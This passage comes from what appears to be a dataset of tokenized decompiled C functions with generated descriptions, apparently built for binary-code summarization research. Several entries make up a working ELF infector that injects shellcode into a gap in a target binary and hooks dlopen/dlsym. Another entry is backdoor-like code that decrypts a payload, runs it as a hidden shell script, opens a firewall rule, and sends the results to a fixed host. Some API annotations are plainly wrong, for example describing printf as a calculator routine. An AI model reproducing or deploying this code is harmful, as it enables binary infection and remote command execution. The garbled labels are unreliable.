            "return",
            "-",
            "1",
            ";",
            "cursora",
            "=",
            "&",
            "elf_base",
            "[",
            "phoff",
            "]",
            ";",
            "for",
            "(",
            "ia",
            "=",
            "0",
            ";",
            "ia",
            "<",
            "phnum",
            ";",
            "+",
            "+",
            "ia",
            ")",
            "{",
            "poff",
            "=",
            "*",
            "(",
            "(",
            "_QWORD",
            "*",
            ")",
            "cursora",
            "+",
            "1",
            ")",
            ";",
            "if",
            "(",
            "poff",
            ">",
            "=",
            "text_end",
            "&",
            "&",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "cursora",
            "=",
            "=",
            "1",
            "&",
            "&",
            "pad_len",
            ">",
            "poff",
            "-",
            "text_end",
            ")",
            "pad_len",
            "=",
            "poff",
            "-",
            "text_end",
            ";",
            "cursora",
            "+",
            "=",
            "phentsize",
            ";",
            "}",
            "area",
            "-",
            ">",
            "fileoffset",
            "=",
            "text_end",
            ";",
            "area",
            "-",
            ">",
            "size",
            "=",
            "pad_len",
            ";",
            "return",
            "0",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [],
        "longer_label": "The code iterates through program headers of an ELF file to find the end of the text segment and calculate the size of the gap between the end of the text segment and the start of the next segment, storing the results in an empty_area_t_0 struct."
    },
    {
        "id": 340,
        "docstring_tokens": [
            "The",
            "code",
            "is",
            "a",
            "function",
            "that",
            "searches",
            "for",
            "a",
            "specific",
            "function",
            "name",
            "in",
            "a",
            "given",
            "ELF",
            "file",
            "and",
            "retrieves",
            "its",
            "virtual",
            "address",
            "in",
            "the",
            "Procedure",
            "Linkage",
            "Table",
            "(",
            "PLT",
            ")",
            "."
        ],
        "code_tokens": [
            "int",
            "__cdecl",
            "FUN0",
            "(",
            "uint8_t",
            "*",
            "elf_base",
            ",",
            "char",
            "*",
            "fun_name",
            ",",
            "plt_entry_t_0",
            "*",
            "plt",
            ")",
            "{",
            "uint16_t",
            "section_entry_size",
            ";",
            "uint16_t",
            "section_entry_count",
            ";",
            "int",
            "i",
            ";",
            "int",
            "j",
            ";",
            "uint32_t",
            "shname_off",
            ";",
            "uint32_t",
            "shlink_i",
            ";",
            "uint8_t",
            "*",
            "cursor",
            ";",
            "uint8_t",
            "*",
            "linkptr",
            ";",
            "uint8_t",
            "*",
            "linklinkptr",
            ";",
            "uint8_t",
            "*",
            "relaptr",
            ";",
            "uint64_t",
            "section_off",
            ";",
            "uint64_t",
            "shfile_off",
            ";",
            "uint8_t",
            "*",
            "string_sec_base",
            ";",
            "uint64_t",
            "shsize",
            ";",
            "uint64_t",
            "vaddr",
            ";",
            "section_off",
            "=",
            "*",
            "(",
            "(",
            "_QWORD",
            "*",
            ")",
            "elf_base",
            "+",
            "5",
            ")",
            ";",
            "section_entry_size",
            "=",
            "*",
            "(",
            "(",
            "_WORD",
            "*",
            ")",
            "elf_base",
            "+",
            "29",
            ")",
            ";",
            "section_entry_count",
            "=",
            "*",
            "(",
            "(",
            "_WORD",
            "*",
            ")",
            "elf_base",
            "+",
            "30",
            ")",
            ";",
            "string_sec_base",
            "=",
            "&",
            "elf_base",
            "[",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "&",
            "elf_base",
            "[",
            "section_off",
            "+",
            "24",
            "+",
            "*",
            "(",
            "(",
            "unsigned",
            "__int16",
            "*",
            ")",
            "elf_base",
            "+",
            "31",
            ")",
            "*",
            "section_entry_size",
            "]",
            "]",
            ";",
            "cursor",
            "=",
            "&",
            "elf_base",
            "[",
            "section_off",
            "]",
            ";",
            "for",
            "(",
            "i",
            "=",
            "0",
            ";",
            "i",
            "<",
            "section_entry_count",
            ";",
            "+",
            "+",
            "i",
            ")",
            "{",
            "shname_off",
            "=",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "cursor",
            ";",
            "shsize",
            "=",
            "*",
            "(",
            "(",
            "_QWORD",
            "*",
            ")",
            "cursor",
            "+",
            "4",
            ")",
            ";",
            "shfile_off",
            "=",
            "*",
            "(",
            "(",
            "_QWORD",
            "*",
            ")",
            "cursor",
            "+",
            "3",
            ")",
            ";",
            "shlink_i",
            "=",
            "*",
            "(",
            "(",
            "_DWORD",
            "*",
            ")",
            "cursor",
            "+",
            "10",
            ")",
            ";",
            "if",
            "(",
            "strstr",
            "(",
            "(",
            "const",
            "char",
            "*",
            ")",
            "&",
            "string_sec_base",
            "[",
            "*",
            "(",
            "unsigned",
            "int",
            "*",
            ")",
            "cursor",
            "]",
            ",",
            "\".rela.plt\"",
            ")",
            "|",
            "|",
            "strstr",
            "(",
            "(",
            "const",
            "char",
            "*",
            ")",
            "&",
            "string_sec_base",
            "[",
            "shname_off",
            "]",
            ",",
            "\".rela.dyn\"",
            ")",
            ")",
            "{",
            "relaptr",
            "=",
            "&",
            "elf_base",
            "[",
            "shfile_off",
            "]",
            ";",
            "linkptr",
            "=",
            "&",
            "elf_base",
            "[",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "&",
            "elf_base",
            "[",
            "section_off",
            "+",
            "24",
            "+",
            "shlink_i",
            "*",
            "section_entry_size",
            "]",
            "]",
            ";",
            "linklinkptr",
            "=",
            "&",
            "elf_base",
            "[",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "&",
            "elf_base",
            "[",
            "section_off",
            "+",
            "24",
            "+",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "&",
            "elf_base",
            "[",
            "section_off",
            "+",
            "40",
            "+",
            "shlink_i",
            "*",
            "section_entry_size",
            "]",
            "*",
            "(",
            "unsigned",
            "int",
            ")",
            "section_entry_size",
            "]",
            "]",
            ";",
            "for",
            "(",
            "j",
            "=",
            "0",
            ";",
            "shsize",
            ">",
            "j",
            ";",
            "j",
            "+",
            "=",
            "24",
            ")",
            "{",
            "vaddr",
            "=",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "&",
            "relaptr",
            "[",
            "j",
            "]",
            ";",
            "if",
            "(",
            "strstr",
            "(",
            "(",
            "const",
            "char",
            "*",
            ")",
            "&",
            "linklinkptr",
            "[",
            "*",
            "(",
            "unsigned",
            "int",
            "*",
            ")",
            "&",
            "linkptr",
            "[",
            "24",
            "*",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "&",
            "relaptr",
            "[",
            "j",
            "+",
            "12",
            "]",
            "]",
            "]",
            ",",
            "fun_name",
            ")",
            ")",
            "{",
            "plt",
            "-",
            ">",
            "vaddr",
            "=",
            "vaddr",
            ";",
            "return",
            "0",
            ";",
            "}",
            "}",
            "cursor",
            "=",
            "&",
            "elf_base",
            "[",
            "section_off",
            "+",
            "i",
            "*",
            "section_entry_size",
            "]",
            ";",
            "}",
            "cursor",
            "+",
            "=",
            "section_entry_size",
            ";",
            "}",
            "return",
            "-",
            "1",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [],
        "longer_label": "The provided code is a function named `find_plt` which searches for a function named `fun_name` within an ELF file, specifically in sections related to PLT (Procedure Linkage Table), and if found, it updates the virtual address (`vaddr`) of the PLT entry accordingly."
    },
    {
        "id": 341,
        "docstring_tokens": [
            "The",
            "code",
            "infects",
            "a",
            "target",
            "binary",
            "with",
            "a",
            "shellcode",
            "that",
            "loads",
            "a",
            "library",
            "and",
            "calls",
            "an",
            "exported",
            "function",
            "by",
            "finding",
            "the",
            "main",
            "function",
            ",",
            "locating",
            "a",
            "gap",
            "for",
            "the",
            "payload",
            ",",
            "and",
            "adding",
            "necessary",
            "pointers",
            "and",
            "strings",
            "to",
            "the",
            "target",
            "binary",
            "."
        ],
        "code_tokens": [
            "int",
            "__cdecl",
            "FUN0",
            "(",
            "char",
            "*",
            "target_path",
            ",",
            "char",
            "*",
            "lib_path",
            ",",
            "char",
            "*",
            "exported_func",
            ")",
            "{",
            "size_t",
            "v4",
            ";",
            "size_t",
            "v5",
            ";",
            "size_t",
            "v6",
            ";",
            "size_t",
            "v7",
            ";",
            "int",
            "tfd",
            ";",
            "uint8_t",
            "*",
            "tdata",
            ";",
            "size_t",
            "tdata_len",
            ";",
            "plt_entry_t_0",
            "dlopen_plt",
            ";",
            "plt_entry_t_0",
            "dlsym_plt",
            ";",
            "uint8_t",
            "*",
            "cursor",
            ";",
            "uint8_t",
            "*",
            "cursor_dst",
            ";",
            "empty_area_t_0",
            "pad_area",
            ";",
            "main_arg_t_0",
            "res",
            ";",
            "unsigned",
            "__int64",
            "v18",
            ";",
            "v18",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "tfd",
            "=",
            "open_and_map",
            "(",
            "target_path",
            ",",
            "&",
            "tdata",
            ",",
            "&",
            "tdata_len",
            ")",
            ";",
            "if",
            "(",
            "tfd",
            "=",
            "=",
            "-",
            "1",
            ")",
            "{",
            "puts",
            "(",
            "\"Couldn't open and map\"",
            ")",
            ";",
            "return",
            "-",
            "1",
            ";",
            "}",
            "if",
            "(",
            "find_arg_main",
            "(",
            "tdata",
            ",",
            "&",
            "res",
            ")",
            ")",
            "{",
            "puts",
            "(",
            "\"Couldn't find main as an arg\"",
            ")",
            ";",
            "close",
            "(",
            "tfd",
            ")",
            ";",
            "return",
            "-",
            "1",
            ";",
            "}",
            "printf",
            "(",
            "\"Found main at %016lx, with rip %016lx\\n\"",
            ",",
            "res",
            ".",
            "main_addr",
            ",",
            "res",
            ".",
            "rip",
            ")",
            ";",
            "if",
            "(",
            "find_gap",
            "(",
            "tdata",
            ",",
            "&",
            "pad_area",
            ")",
            ")",
            "{",
            "puts",
            "(",
            "\"Couldn't find a gap\"",
            ")",
            ";",
            "return",
            "-",
            "1",
            ";",
            "}",
            "printf",
            "(",
            "\"foff = %lx, vaddr = %lx, len = %lx\\n\"",
            ",",
            "pad_area",
            ".",
            "fileoffset",
            ",",
            "pad_area",
            ".",
            "vaddr",
            ",",
            "pad_area",
            ".",
            "size",
            ")",
            ";",
            "if",
            "(",
            "find_plt",
            "(",
            "tdata",
            ",",
            "\"dlopen\"",
            ",",
            "&",
            "dlopen_plt",
            ")",
            ")",
            "{",
            "puts",
            "(",
            "\"Couldn't find dlopen!\"",
            ")",
            ";",
            "return",
            "-",
            "1",
            ";",
            "}",
            "if",
            "(",
            "find_plt",
            "(",
            "tdata",
            ",",
            "\"dlsym\"",
            ",",
            "&",
            "dlsym_plt",
            ")",
            ")",
            "{",
            "puts",
            "(",
            "\"Couldn't find dlsym!\"",
            ")",
            ";",
            "return",
            "-",
            "1",
            ";",
            "}",
            "printf",
            "(",
            "\"Found dlsym at %lx\\n\"",
            ",",
            "dlsym_plt",
            ".",
            "vaddr",
            ")",
            ";",
            "printf",
            "(",
            "\"Shellcode start %p end %p size = %ld\\n\"",
            ",",
            "SH_CODE_START",
            ",",
            "&",
            "SH_CODE_END",
            ",",
            "&",
            "SH_CODE_END",
            "-",
            "(",
            "_UNKNOWN",
            "*",
            ")",
            "SH_CODE_START",
            ")",
            ";",
            "v4",
            "=",
            "strlen",
            "(",
            "lib_path",
            ")",
            ";",
            "v5",
            "=",
            "strlen",
            "(",
            "exported_func",
            ")",
            ";",
            "if",
            "(",
            "&",
            "SH_CODE_END",
            "-",
            "(",
            "_UNKNOWN",
            "*",
            ")",
            "SH_CODE_START",
            "+",
            "24",
            "+",
            "v4",
            "+",
            "v5",
            ">",
            "pad_area",
            ".",
            "size",
            ")",
            "{",
            "puts",
            "(",
            "\"The payload is too big\"",
            ")",
            ";",
            "return",
            "-",
            "1",
            ";",
            "}",
            "cursor_dst",
            "=",
            "&",
            "tdata",
            "[",
            "pad_area",
            ".",
            "fileoffset",
            "]",
            ";",
            "for",
            "(",
            "cursor",
            "=",
            "(",
            "uint8_t",
            "*",
            ")",
            "SH_CODE_START",
            ";",
            "cursor",
            "<",
            "(",
            "uint8_t",
            "*",
            ")",
            "&",
            "SH_CODE_END",
            ";",
            "+",
            "+",
            "cursor",
            ")",
            "*",
            "cursor_dst",
            "+",
            "+",
            "=",
            "*",
            "cursor",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "cursor_dst",
            "=",
            "res",
            ".",
            "main_addr",
            ";",
            "cursor_dst",
            "+",
            "=",
            "8",
            ";",
            "*",
            "(",
            "plt_entry_t_0",
            "*",
            ")",
            "cursor_dst",
            "=",
            "dlsym_plt",
            ";",
            "cursor_dst",
            "+",
            "=",
            "8",
            ";",
            "*",
            "(",
            "plt_entry_t_0",
            "*",
            ")",
            "cursor_dst",
            "=",
            "dlopen_plt",
            ";",
            "cursor_dst",
            "+",
            "=",
            "8",
            ";",
            "strcpy",
            "(",
            "(",
            "char",
            "*",
            ")",
            "cursor_dst",
            ",",
            "lib_path",
            ")",
            ";",
            "v6",
            "=",
            "strlen",
            "(",
            "lib_path",
            ")",
            ";",
            "cursor_dst",
            "+",
            "=",
            "v6",
            "+",
            "1",
            ";",
            "strcpy",
            "(",
            "(",
            "char",
            "*",
            ")",
            "cursor_dst",
            ",",
            "exported_func",
            ")",
            ";",
            "v7",
            "=",
            "strlen",
            "(",
            "exported_func",
            ")",
            ";",
            "cursor_dst",
            "+",
            "=",
            "v7",
            "+",
            "1",
            ";",
            "if",
            "(",
            "res",
            ".",
            "rip",
            ")",
            "{",
            "if",
            "(",
            "res",
            ".",
            "addr_size",
            "!",
            "=",
            "4",
            ")",
            "goto",
            "LABEL_18",
            ";",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "res",
            ".",
            "file_ptr",
            "=",
            "LODWORD",
            "(",
            "pad_area",
            ".",
            "vaddr",
            ")",
            "-",
            "LODWORD",
            "(",
            "res",
            ".",
            "rip",
            ")",
            ";",
            "}",
            "else",
            "{",
            "if",
            "(",
            "res",
            ".",
            "addr_size",
            "!",
            "=",
            "4",
            ")",
            "{",
            "LABEL_18",
            ":",
            "puts",
            "(",
            "\"unsupported size\"",
            ")",
            ";",
            "return",
            "-",
            "1",
            ";",
            "}",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "res",
            ".",
            "file_ptr",
            "=",
            "pad_area",
            ".",
            "vaddr",
            ";",
            "}",
            "if",
            "(",
            "!",
            "unmap_and_close",
            "(",
            "tfd",
            ",",
            "tdata",
            ",",
            "tdata_len",
            ")",
            ")",
            "return",
            "0",
            ";",
            "puts",
            "(",
            "\"Could not close correctly!\"",
            ")",
            ";",
            "return",
            "-",
            "1",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `__readfsqword` is used to read an unsigned 64-bit integer value from the FS segment register, which is often utilized in low-level system programming, particularly in Windows environments, for accessing thread-local storage or other kernel data structures.",
            "The function `printf` is being redefined and its behavior modified for a specific context, likely for a specialized calculator or numerical processing application, as indicated by the first code snippet which defines mathematical operations and the usage of `printf` to output results, while the second snippet adjusts behavior for different system environments, suggesting a customized implementation of the standard `printf` function."
        ],
        "longer_label": "The code is a C function designed to inject shellcode into a target binary, utilizing functions like `open_and_map`, `find_plt`, and `strcpy`, with additional annotations detailing the usage of `__readfsqword` and a customized `printf` function."
    },
    {
        "id": 342,
        "docstring_tokens": [
            "The",
            "code",
            "checks",
            "if",
            "the",
            "number",
            "of",
            "command",
            "line",
            "arguments",
            "is",
            "less",
            "than",
            "4",
            ",",
            "prints",
            "usage",
            "information",
            "and",
            "exits",
            "with",
            "-1",
            "if",
            "so",
            ",",
            "then",
            "attempts",
            "to",
            "infect",
            "a",
            "file",
            "using",
            "the",
            "arguments",
            ",",
            "prints",
            "``",
            "Failed",
            "''",
            "and",
            "returns",
            "-1",
            "if",
            "unsuccessful",
            ",",
            "and",
            "prints",
            "``",
            "Success",
            "''",
            "and",
            "returns",
            "0",
            "if",
            "successful",
            "."
        ],
        "code_tokens": [
            "int",
            "__cdecl",
            "FUN0",
            "(",
            "int",
            "argc",
            ",",
            "const",
            "char",
            "*",
            "*",
            "argv",
            ",",
            "const",
            "char",
            "*",
            "*",
            "envp",
            ")",
            "{",
            "if",
            "(",
            "argc",
            "<",
            "=",
            "3",
            ")",
            "{",
            "print_usage",
            "(",
            "(",
            "char",
            "*",
            ")",
            "*",
            "argv",
            ")",
            ";",
            "exit",
            "(",
            "-",
            "1",
            ")",
            ";",
            "}",
            "if",
            "(",
            "do_infect",
            "(",
            "(",
            "char",
            "*",
            ")",
            "argv",
            "[",
            "1",
            "]",
            ",",
            "(",
            "char",
            "*",
            ")",
            "argv",
            "[",
            "2",
            "]",
            ",",
            "(",
            "char",
            "*",
            ")",
            "argv",
            "[",
            "3",
            "]",
            ")",
            ")",
            "{",
            "puts",
            "(",
            "\"Failed\"",
            ")",
            ";",
            "return",
            "-",
            "1",
            ";",
            "}",
            "else",
            "{",
            "puts",
            "(",
            "\"Success\"",
            ")",
            ";",
            "return",
            "0",
            ";",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function named `print` seems to be overloaded in the provided code snippets, appearing to serve multiple purposes such as printing a 2D array of characters, printing integers in a linked list, and possibly printing data related to a specific task or algorithm implemented in the program."
        ],
        "longer_label": "The provided code is a C program's main function designed to execute a task involving infecting a target file with specified arguments, accompanied by annotations highlighting potential overloading of a `print` function for various purposes within the program."
    },
    {
        "id": 343,
        "docstring_tokens": [
            "The",
            "function",
            "open_and_map",
            "opens",
            "a",
            "file",
            "specified",
            "by",
            "fname",
            ",",
            "maps",
            "its",
            "contents",
            "to",
            "a",
            "uint8_t",
            "pointer",
            "data",
            ",",
            "and",
            "sets",
            "the",
            "size",
            "of",
            "the",
            "file",
            "to",
            "len",
            ",",
            "returning",
            "the",
            "file",
            "descriptor",
            "if",
            "successful",
            "or",
            "-1",
            "if",
            "an",
            "error",
            "occurs",
            "."
        ],
        "code_tokens": [
            "int",
            "__cdecl",
            "FUN0",
            "(",
            "char",
            "*",
            "fname",
            ",",
            "uint8_t",
            "*",
            "*",
            "data",
            ",",
            "size_t",
            "*",
            "len",
            ")",
            "{",
            "int",
            "fd",
            ";",
            "__off_t",
            "size",
            ";",
            "stat",
            "st",
            ";",
            "unsigned",
            "__int64",
            "v8",
            ";",
            "v8",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "fd",
            "=",
            "open",
            "(",
            "fname",
            ",",
            "1026",
            ",",
            "0L",
            "L",
            ")",
            ";",
            "if",
            "(",
            "fd",
            "<",
            "0",
            ")",
            "return",
            "-",
            "1",
            ";",
            "if",
            "(",
            "fstat",
            "(",
            "fd",
            ",",
            "&",
            "st",
            ")",
            ")",
            "return",
            "-",
            "1",
            ";",
            "size",
            "=",
            "st",
            ".",
            "st_size",
            ";",
            "*",
            "data",
            "=",
            "(",
            "uint8_t",
            "*",
            ")",
            "mmap",
            "(",
            "0L",
            "L",
            ",",
            "st",
            ".",
            "st_size",
            ",",
            "7",
            ",",
            "1",
            ",",
            "fd",
            ",",
            "0L",
            "L",
            ")",
            ";",
            "if",
            "(",
            "*",
            "data",
            "=",
            "=",
            "(",
            "uint8_t",
            "*",
            ")",
            "-",
            "1L",
            "L",
            ")",
            "return",
            "-",
            "1",
            ";",
            "*",
            "len",
            "=",
            "size",
            ";",
            "return",
            "fd",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `__readfsqword` is likely used to read an unsigned 64-bit integer value from a specific offset within the segment register FS on x86 architecture, primarily for low-level system or kernel-level programming tasks."
        ],
        "longer_label": "The code is a C function that opens a file, retrieves its size, and then maps the file into memory, potentially for low-level system or kernel-level programming tasks on x86 architecture using the `__readfsqword` function."
    },
    {
        "id": 344,
        "docstring_tokens": [
            "The",
            "function",
            "``",
            "prefix_tochar",
            "''",
            "converts",
            "a",
            "given",
            "prefix",
            "structure",
            "to",
            "a",
            "character",
            "pointer",
            ",",
            "returning",
            "NULL",
            "if",
            "the",
            "prefix",
            "is",
            "NULL",
            "."
        ],
        "code_tokens": [
            "u_char",
            "*",
            "FUN0",
            "prefix_tochar",
            "(",
            "prefix_t",
            "*",
            "prefix",
            ")",
            "{",
            "if",
            "(",
            "prefix",
            ")",
            "return",
            "(",
            "u_char",
            "*",
            ")",
            "&",
            "prefix",
            "-",
            ">",
            "add",
            ";",
            "else",
            "return",
            "0L",
            "L",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The `u_char` function, defined as a typedef for `unsigned char`, is likely used to represent unsigned characters in a cross-platform manner, with specific considerations for compatibility with Windows (WIN32), particularly in network programming or system-level operations, as indicated by the inclusion of related typedefs and constants.",
            "The \"prefix\" function seems to compare two strings character by character until a mismatch is found, likely intended for checking if one string is a prefix of another, while the provided code snippets suggest additional functionality related to macro prefixing and potentially file handling operations."
        ],
        "longer_label": "The provided code likely aims to convert a given prefix structure into a character array, potentially for use in network programming or system-level operations, while ensuring compatibility with Windows, though further context on the purpose of the prefix structure and its related functionality would be necessary for a more precise conclusion."
    },
    {
        "id": 345,
        "docstring_tokens": [
            "The",
            "code",
            "compares",
            "two",
            "memory",
            "addresses",
            "using",
            "a",
            "specified",
            "mask",
            "and",
            "returns",
            "1",
            "if",
            "they",
            "match",
            ",",
            "otherwise",
            "returns",
            "0",
            "."
        ],
        "code_tokens": [
            "int",
            "__cdecl",
            "FUN0",
            "(",
            "void",
            "*",
            "addr",
            ",",
            "void",
            "*",
            "dest",
            ",",
            "u_int",
            "mask",
            ")",
            "{",
            "return",
            "!",
            "memcmp",
            "(",
            "addr",
            ",",
            "dest",
            ",",
            "mask",
            ">",
            ">",
            "3",
            ")",
            "&",
            "&",
            "(",
            "(",
            "mask",
            "&",
            "7",
            ")",
            "=",
            "=",
            "0",
            "|",
            "|",
            "(",
            "(",
            "-",
            "1",
            "<",
            "<",
            "(",
            "8",
            "-",
            "(",
            "mask",
            "&",
            "7",
            ")",
            ")",
            ")",
            "&",
            "(",
            "unsigned",
            "__int8",
            ")",
            "(",
            "*",
            "(",
            "(",
            "_BYTE",
            "*",
            ")",
            "addr",
            "+",
            "(",
            "mask",
            ">",
            ">",
            "3",
            ")",
            ")",
            "^",
            "*",
            "(",
            "(",
            "_BYTE",
            "*",
            ")",
            "dest",
            "+",
            "(",
            "mask",
            ">",
            ">",
            "3",
            ")",
            ")",
            ")",
            ")",
            "=",
            "=",
            "0",
            ")",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [],
        "longer_label": "The provided code is a function `comp_with_mask` that compares memory blocks pointed to by `addr` and `dest` using a bitmask `mask`, checking if the specified bits are equal while considering byte alignment."
    },
    {
        "id": 346,
        "docstring_tokens": [
            "The",
            "function",
            "ParsePayload",
            "decrypts",
            "and",
            "writes",
            "the",
            "payload",
            "to",
            "a",
            "file",
            ",",
            "then",
            "executes",
            "various",
            "system",
            "commands",
            ",",
            "sends",
            "results",
            "to",
            "a",
            "specified",
            "destination",
            ",",
            "and",
            "turns",
            "off",
            "a",
            "specified",
            "IP",
            "address",
            "."
        ],
        "code_tokens": [
            "void",
            "__cdecl",
            "FUN0",
            "(",
            "const",
            "u_char",
            "*",
            "payload",
            ",",
            "int",
            "len",
            ")",
            "{",
            "size_t",
            "v2",
            ";",
            "unsigned",
            "__int8",
            "decryptedtext",
            "[",
            "1040",
            "]",
            ";",
            "_BYTE",
            "dport",
            "[",
            "4",
            "]",
            ";",
            "char",
            "*",
            "destip",
            ";",
            "char",
            "*",
            "srcip",
            ";",
            "int",
            "decryptedlen",
            ";",
            "int",
            "cipherlen",
            ";",
            "FILE",
            "*",
            "fp",
            ";",
            "fp",
            "=",
            "fopen",
            "(",
            "\".cmd.sh\"",
            ",",
            "\"wb+\"",
            ")",
            ";",
            "cipherlen",
            "=",
            "strlen",
            "(",
            "(",
            "const",
            "char",
            "*",
            ")",
            "payload",
            ")",
            ";",
            "decryptedlen",
            "=",
            "decryptMessage",
            "(",
            "(",
            "unsigned",
            "__int8",
            "*",
            ")",
            "payload",
            ",",
            "1040",
            ",",
            "\"01234567890123456789012345678901\"",
            ",",
            "\"0123456789012345\"",
            ",",
            "decryptedtext",
            ")",
            ";",
            "printf",
            "(",
            "\"Decrypted payload size: %d\\n\"",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "decryptedlen",
            ")",
            ";",
            "printf",
            "(",
            "\"Decrypted Payload is: %s \\n\"",
            ",",
            "(",
            "const",
            "char",
            "*",
            ")",
            "decryptedtext",
            ")",
            ";",
            "v2",
            "=",
            "strlen",
            "(",
            "(",
            "const",
            "char",
            "*",
            ")",
            "decryptedtext",
            ")",
            ";",
            "if",
            "(",
            "!",
            "fwrite",
            "(",
            "decryptedtext",
            ",",
            "v2",
            ",",
            "1uL",
            "L",
            ",",
            "fp",
            ")",
            ")",
            "{",
            "perror",
            "(",
            "\"fwrite\"",
            ")",
            ";",
            "exit",
            "(",
            "1",
            ")",
            ";",
            "}",
            "fclose",
            "(",
            "fp",
            ")",
            ";",
            "system",
            "(",
            "\"chmod 755 .cmd.sh\"",
            ")",
            ";",
            "system",
            "(",
            "\"./.cmd.sh > .results\"",
            ")",
            ";",
            "system",
            "(",
            "\"iptables -I INPUT 1 -p tcp -s 192.168.0.100 --dport 8505 -j ACCEPT\"",
            ")",
            ";",
            "srcip",
            "=",
            "\"192.168.0.100\"",
            ";",
            "destip",
            "=",
            "\"192.168.0.109\"",
            ";",
            "qmemcpy",
            "(",
            "dport",
            ",",
            "\"9!9!\"",
            ",",
            "sizeof",
            "(",
            "dport",
            ")",
            ")",
            ";",
            "send_results",
            "(",
            "\"192.168.0.100\"",
            ",",
            "\"192.168.0.109\"",
            ",",
            "0x2139u",
            ",",
            "0x2139u",
            ",",
            "\".results\"",
            ")",
            ";",
            "system",
            "(",
            "\"iptables -D INPUT -p tcp -s 192.168.0.100 --dport 8505 -j ACCEPT\"",
            ")",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The `printf` function in this context appears to be a customized implementation within a larger C codebase, featuring an RPN calculator and formatting functionality for different systems, possibly for use in embedded systems or specialized environments.",
            "The function \"perror\" is used to print a descriptive error message to the standard error stream, typically after encountering an error during a file operation, aiding in debugging by providing context on the error.",
            "The \"write\" function appears to be a part of a custom file handling library implemented using mmap for efficient read/write operations and file management in C, allowing for writing data to files identified by file descriptors with error handling and file management functionalities."
        ],
        "longer_label": "The provided code is a C function `ParsePayload` that decrypts a payload using a hardcoded key and initialization vector, writes the decrypted payload to a file, executes a shell script contained within it, performs network operations including adding and removing iptables rules, and sends results to a specified destination, featuring customized printf, perror, and fwrite functions, possibly within a specialized embedded system environment."
    },
    {
        "id": 347,
        "docstring_tokens": [
            "The",
            "function",
            "my_inet_pton",
            "converts",
            "a",
            "string",
            "representation",
            "of",
            "an",
            "IPv4",
            "or",
            "IPv6",
            "address",
            "to",
            "a",
            "binary",
            "format",
            "depending",
            "on",
            "the",
            "address",
            "family",
            "specified",
            "and",
            "returns",
            "1",
            "if",
            "successful",
            ",",
            "0",
            "if",
            "the",
            "address",
            "is",
            "invalid",
            ",",
            "and",
            "-1",
            "if",
            "the",
            "address",
            "family",
            "is",
            "not",
            "supported",
            "."
        ],
        "code_tokens": [
            "int",
            "__cdecl",
            "FUN0",
            "(",
            "int",
            "af_0",
            ",",
            "const",
            "char",
            "*",
            "src",
            ",",
            "void",
            "*",
            "dst",
            ")",
            "{",
            "const",
            "char",
            "*",
            "v3",
            ";",
            "const",
            "char",
            "*",
            "v5",
            ";",
            "const",
            "char",
            "*",
            "srca",
            ";",
            "int",
            "i",
            ";",
            "int",
            "c",
            ";",
            "int",
            "val",
            ";",
            "u_char",
            "xp",
            "[",
            "4",
            "]",
            ";",
            "unsigned",
            "__int64",
            "v12",
            ";",
            "srca",
            "=",
            "src",
            ";",
            "v12",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "if",
            "(",
            "af_0",
            "=",
            "=",
            "2",
            ")",
            "{",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "xp",
            "=",
            "0",
            ";",
            "for",
            "(",
            "i",
            "=",
            "0",
            ";",
            ";",
            "+",
            "+",
            "i",
            ")",
            "{",
            "v3",
            "=",
            "srca",
            "+",
            "+",
            ";",
            "c",
            "=",
            "*",
            "v3",
            ";",
            "if",
            "(",
            "(",
            "(",
            "*",
            "_ctype_b_loc",
            "(",
            ")",
            ")",
            "[",
            "c",
            "]",
            "&",
            "0x800",
            ")",
            "=",
            "=",
            "0",
            ")",
            "return",
            "-",
            "1",
            ";",
            "val",
            "=",
            "0",
            ";",
            "do",
            "{",
            "val",
            "=",
            "10",
            "*",
            "val",
            "+",
            "c",
            "-",
            "48",
            ";",
            "if",
            "(",
            "val",
            ">",
            "255",
            ")",
            "return",
            "0",
            ";",
            "v5",
            "=",
            "srca",
            "+",
            "+",
            ";",
            "c",
            "=",
            "*",
            "v5",
            ";",
            "}",
            "while",
            "(",
            "*",
            "v5",
            "&",
            "&",
            "(",
            "(",
            "*",
            "_ctype_b_loc",
            "(",
            ")",
            ")",
            "[",
            "c",
            "]",
            "&",
            "0x800",
            ")",
            "!",
            "=",
            "0",
            ")",
            ";",
            "xp",
            "[",
            "i",
            "]",
            "=",
            "val",
            ";",
            "if",
            "(",
            "!",
            "c",
            ")",
            "break",
            ";",
            "if",
            "(",
            "c",
            "!",
            "=",
            "46",
            ")",
            "return",
            "0",
            ";",
            "if",
            "(",
            "i",
            ">",
            "2",
            ")",
            "return",
            "0",
            ";",
            "}",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "dst",
            "=",
            "*",
            "(",
            "_DWORD",
